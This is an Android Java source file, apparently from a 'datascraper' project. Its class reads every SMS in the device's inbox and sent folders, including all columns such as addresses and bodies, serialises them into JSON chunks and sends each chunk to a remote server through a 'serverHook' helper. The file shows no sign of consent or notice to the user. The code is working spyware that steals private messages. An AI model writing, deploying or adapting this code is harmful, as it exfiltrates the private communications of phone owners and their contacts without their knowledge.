package com.example.alex.datascraper;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Alex on 10/22/2017.
 */

public class modalityText extends AppCompatActivity {

    private final int chunkSize = 4096;

    // scrapes texts and sends them to a server
    public void getTexts(Context mContext){
        // array of all texts

        List<String> texts = new ArrayList<>();

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        String colName, val;
        String msgData = "[";

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData += "{";

                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);

                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }
                }

                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";

                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("text", msgData);
                    msgData = "[";
                }
                //serverHook.sendToServer("text",msgData);
            } while (cursor.moveToNext());
        } else {
            System.out.println("No messages found");
        }
        cursor.close();

        // sent cursor
        cursor = mContext.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData += "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);

                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }

                }

                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("text", msgData);
                    msgData = "[";
                }
                //serverHook.sendToServer("text",msgData);
            } while (cursor.moveToNext());
        } else {
            System.out.println("No messages found");
        }
        cursor.close();
        if(msgData.length() > 1){
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "]";
            serverHook.sendToServer("text", msgData);
        }

    }

}
